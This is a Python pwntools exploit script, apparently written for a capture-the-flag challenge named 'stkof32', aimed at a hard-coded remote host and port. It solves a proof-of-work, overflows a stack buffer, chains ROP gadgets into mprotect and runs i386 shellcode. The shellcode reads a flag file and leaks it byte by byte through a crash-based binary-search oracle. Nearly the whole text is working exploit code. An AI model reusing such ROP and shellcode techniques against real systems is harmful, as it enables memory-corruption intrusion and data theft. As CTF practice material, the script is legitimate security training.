from pwn import *

local=0
elf_filename='./stkof32'
ip='49.4.51.149'
port=25391
token='b69cafaadb0a218d49f59b72bd97a8e9'

#context.log_level='debug'

bss=0x080d9060
pop_eax=0x080a8af6
pop_ebx=0x080481c9
pop2=pop_ecx_ebx=0x0806e9f2
pop3=0x0806a51d
pop_edx=0x0806e9cb
eax_to_edx=0x08056a85
int80=0x080495a3
vul=0x080488A5
puts=0x080500C0
open=0x806C7C0
read=0x0806C8E0
write=0x806C9B0
mprotect=0x0806D7B0

def write_data(offset,addr,data):
    return p32(pop_edx)+p32(addr+offset)+p32(pop_eax)+data+p32(eax_to_edx)

def write_string(offset,addr,data):
    payload=''
    for i in range((len(data)/4)+1):
        payload+=write_data(offset+4*i,addr,data[4*i:4*i+4].ljust(4,'\x00'))
    return payload

def exp(offset,value):
    if local:
        io=process(elf_filename)
    else:
        
        io=remote(ip, port)
        io.recvuntil('()=')
        target=io.recvline()[:-1]
        io.recvuntil('=')
        prefix=io.recvline()[:-1].decode('hex')
        match=0
        for a in range(0x100):
            for b in range(0x100):
                for c in range(0x100):
                    if hashlib.sha256(prefix+chr(a)+chr(b)+chr(c)).hexdigest()==target:
                        match=1
                        target=prefix+chr(a)+chr(b)+chr(c)
                        break
                if match: break
            if match: break
        io.sendline(target.encode('hex'))
        #print target.encode('hex')
        io.sendlineafter('token:',token)
        #print token
        #print io.recvuntil('Welcome')

    payload='a'*0x110

    payload+=p32(mprotect)+p32(pop3)+p32(0x080DB000)+p32(0x1000)+p32(7)

    shellcode1='''
        mov ebx,0x080DB160
        xor ecx,ecx
        xor edx,edx
        xor eax,eax
        mov al,5
        int 0x80

        mov ebx,eax
        mov ecx,0x080DB160
        xor edx,edx
        mov dl,0x40
        xor eax,eax
        mov al,3
        int 0x80

        mov ecx,%s
        cmp byte ptr [ecx], %s
    ''' % (hex(0x080DB160+offset), hex(value))
    shellcode1=asm(shellcode1,arch='i386',os='linux')

    shellcode2='''
        xor ebx,ebx
        inc ebx
        xor eax,eax
        mov al,4
        int 0x80
    '''
    shellcode2=asm(shellcode2,arch='i386',os='linux')

    shellcode=shellcode1+'\x73\x30'+shellcode2

    payload+=write_string(0,0x080DB060,shellcode)
    filename='flag_024308b5c25f586b34e02bbd092ba2fb\x00'
    payload+=write_string(0,0x080DB160,filename)

    payload+=p32(0x080DB060)

    #print 'length:', hex(len(payload))

    io.sendafter('pwn it?\n',payload)
    #print 'result: '
    io.recvuntil('a'*0x110)
    io.recvline()
    try:
        io.recv()
        io.close()
        return False
    except:
        io.close()
        return True

enc='52520f5a505207070751045756070c07555a5e050055520553550c0052595201'
for i in range(len(enc),0x40):
    left=0x0
    right=0xff
    while True:
        mid=(left+right)/2
        print 'trying:', mid

        if exp(i, mid):
            if mid-left==1:
                print chr(mid)
                enc+=chr(mid)
                break
            left=mid
        else:
            if mid-left==1:
                print chr(left)
                enc+=chr(left)
                break
            right=mid
    print enc

enc=enc.decode('hex')
flag=''

for i in range(len(enc)):
    flag+=chr(ord(enc[i])^ord(token[i]))

print 'flag{%s}' % flag